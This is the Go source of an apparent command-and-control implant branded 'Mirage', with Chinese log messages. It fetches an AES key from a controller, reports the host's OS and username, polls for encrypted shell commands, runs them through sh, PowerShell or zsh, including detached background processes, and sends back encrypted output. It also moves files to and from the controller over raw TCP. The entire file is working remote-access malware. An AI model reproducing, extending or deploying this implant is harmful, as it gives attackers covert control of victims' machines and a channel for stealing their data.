package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func encodeOrikey(originalkey string) string {
	orgkey32 := originalkey
	first16 := orgkey32[:16]
	last16 := orgkey32[len(orgkey32)-16:]
	hash := md5.Sum([]byte(last16))
	hashString := hex.EncodeToString(hash[:])
	crkey32 := first16 + hashString[:16]
	return crkey32
}

func switchkey(ip string) string {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "http://"+ip+SwitchKeyUri, nil)
	req.Header.Set("MirageSay", Banner)
	resp, err := client.Do(req)
	if err != nil {
		return "Error"
	}
	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	parts := strings.Split(string(body), " ")
	return encodeOrikey(parts[0])
}

func crypto(org string, key string) []byte {
	plaintext := []byte(org)
	block, _ := aes.NewCipher([]byte(key))
	commonIV := []byte("Mirage&&DeepMoun")
	cfb := cipher.NewCFBEncrypter(block, commonIV)
	ciphertext := make([]byte, len(plaintext))
	cfb.XORKeyStream(ciphertext, plaintext)
	return ciphertext
}

func decrypto(ciphertext []byte, crkey string) string {
	block, _ := aes.NewCipher([]byte(crkey))
	commonIV := []byte("Mirage&&DeepMoun")
	cfbdec := cipher.NewCFBDecrypter(block, commonIV)
	plaintext := make([]byte, len(ciphertext))
	cfbdec.XORKeyStream(plaintext, ciphertext)
	return string(plaintext)
}

func DeResult(ciphertext []byte, key string) map[int]string {
	var data map[int]string
	if err := json.Unmarshal(ciphertext, &data); err != nil {
		return nil
	}
	for id, value := range data {
		base64DecodeCommand, _ := base64.StdEncoding.DecodeString(value)
		data[id] = decrypto(base64DecodeCommand, key)
	}
	return data
}

func splitCommand(command string) []string {
	switch platform {
	case "linux":
		return []string{"sh", "-c", command}
	case "windows":
		return []string{"powershell", "-Command", command}
	case "darwin":
		return []string{"zsh", "-c", command}
	default:
		return []string{command}
	}
}

func execProcess(command string) []string {
	switch platform {
	case "linux":
		return []string{"nohup","sh", "-c", command}
	case "windows":
		return []string{"powershell", "-Command", command}
	case "darwin":
		return []string{"nohup","zsh" ,"-c", command}
	default:
		return []string{command}
	}
}

func fileTransferServer(action, fileandport, ip string) {
	parts := strings.Split(fileandport, "[Mirage]")
	partsfile := strings.Split(ip, ":")
	conn, err := net.Dial("tcp", partsfile[0]+":"+parts[1])
	if err != nil {
		fmt.Println("[-] 连接服务端失败:", err)
		return
	}
	defer conn.Close()

	if action == "download" {
		file, err := os.Open(parts[0]) // 待发送的文件
		if err != nil {
			fmt.Println("[-] 无法打开文件:", err)
			return
		}
		defer file.Close()

		// 读取并发送文件，同时计算进度
		buffer := make([]byte, 4096)
		var totalBytes int64
		fileStat, _ := file.Stat()
		fileSize := fileStat.Size()
		for {
			n, err := file.Read(buffer)
			if n > 0 {
				totalBytes += int64(n)
				conn.Write(buffer[:n])
				percentage := float64(totalBytes) / float64(fileSize) * 100
				fmt.Printf("\r发送数据中: %.2f%%", percentage)
			}
			if err == io.EOF {
				fmt.Println("\n[+] 文件发送完成!")
				break
			} else if err != nil {
				fmt.Println("[-] 文件发送错误:", err)
				break
			}
		}
	} else {
		file, err := os.Create(parts[0])
		if err != nil {
			fmt.Printf("[-] 无法创建文件: %v\n", err)
			return
		}
		defer file.Close()

		buffer := make([]byte, 4096)
		var totalBytes int64
		for {
			n, err := conn.Read(buffer)
			if n > 0 {
				totalBytes += int64(n)
				file.Write(buffer[:n])
				fmt.Printf("\n[*] 接收数据中: %d bytes", totalBytes)
			}
			if err == io.EOF {
				fmt.Printf("\n[+] 文件下载完成!\n")
				break
			} else if err != nil {
				fmt.Printf("\n[-] 文件接收错误: %v\n", err)
				break
			}
		}
	}

}

func sendHearbeat(ip string, key string) bool {
	client := &http.Client{}
	req, _ := http.NewRequest("GET", "http://"+ip+HeartbeatUri, nil)
	banner := Banner
	crybanner := base64.StdEncoding.EncodeToString(crypto(banner, key))
	req.Header.Set("MirageSay", crybanner)
	resp, err := client.Do(req)
	// 监测目标侦听是否运行
	if err != nil {
		return true
	}
	body, ReadbodyErr := ioutil.ReadAll(resp.Body)
	if ReadbodyErr != nil {
		fmt.Println("[-] Error reading response body:", ReadbodyErr)
		return true
	}

	// 监测是否存在默认关键词
	if string(body) != "[*] Feel good!" {
		orgcommand := DeResult(body, key)
		execResult := make(map[int]string)
		for id, value := range orgcommand {

			switch id {
			case 99997:
				go fileTransferServer("download", value, ip)
				continue
			case 99996:
				go fileTransferServer("upload", value, ip)
				continue
			case 99995,90000:
				cmdParts := execProcess(value)
				cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
				cmd.Start()
				fmt.Printf("[+] Process start\n")
				continue
			}

			// 分割命令字符串
			cmdParts := splitCommand(value)
			cmd := exec.Command(cmdParts[0], cmdParts[1:]...)

			// 获取执行结果或错误信息
			output, err := cmd.CombinedOutput()
			if err != nil {
			    fmt.Printf("[-] Command exec error: %v . output: %s\n",err,output)
				execResult[id] = base64.StdEncoding.EncodeToString(crypto("[-+] Error: Bad Command: "+value+"\n", key))
			} else {
				execResult[id] = base64.StdEncoding.EncodeToString(crypto(string(output), key))
			}
		}
		// 发送命令执行的结果
		jsonData, err := json.Marshal(execResult)
		url := "http://" + ip + ResultUri
		respResult, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("[-] JSON 转换失败: %v\n", err)
			return true
		}
		if err != nil {
			fmt.Printf("[-] 请求发送失败: %v\n", err)
			return true
		}
		defer respResult.Body.Close()
	}
	return false
}

var platform string

func initshell(ip string, key string) string {
    cmd := exec.Command("whoami")
    currentUser, _ := cmd.Output()
    currentUserstr := strings.TrimSpace(string(currentUser))

	platform = runtime.GOOS
    if platform == "windows" {
        os.MkdirAll("C:\\temp", os.ModePerm)
    }
	client := &http.Client{}
	//message := base64.StdEncoding.EncodeToString(crypto("First Connection Miragec2[Mirage]"+platform+"[Mirage]"+string(processname)+"[Mirage]"+processid+"[Mirage]"+string(currentUser), key))
	message := base64.StdEncoding.EncodeToString(crypto("First Connection Miragec2[Mirage]"+platform+"[Mirage]"+currentUserstr, key))
	payload := strings.NewReader(`{"99999": "` + message + `"}`)
	req, _ := http.NewRequest("POST", "http://"+ip+ResultUri, payload)
	req.Header.Set("Content-Type", "application/json")
	client.Do(req)
	client.CloseIdleConnections()
	return message
}

func keepsend(serverIP, key string) {
	sleepInterval := 2 * time.Second
	timeoutInt := 0
	resetInt := 0

	for {
		if key == "Error" {
			timeoutInt += 1
			time.Sleep(sleepInterval)
		} else {
			if sendHearbeat(serverIP, key) == true {
				timeoutInt += 1
				time.Sleep(sleepInterval)
			} else {
				timeoutInt = 0
				resetInt = 0
				time.Sleep(sleepInterval)
			}
		}

		if timeoutInt == 1 {
			key = switchkey(serverIP)
			if key == "Error" {
				timeoutInt = 0
				resetInt += 1
			} else {
				initshell(serverIP, key)
			}
		}

		if resetInt == 10 {
			return
		}
	}
}

const (
	Banner       = "Powered By Mirage"
	SwitchKeyUri = "/Mirage"
	HeartbeatUri = "/feelgood"
	ResultUri    = "/wowResult"
)

func main() {
	serverIP := "127.0.0.1:8888"
	key := switchkey(serverIP)
	if key != "Error" {
	    initshell(serverIP, key)
	    keepsend(serverIP, key)
	}
}
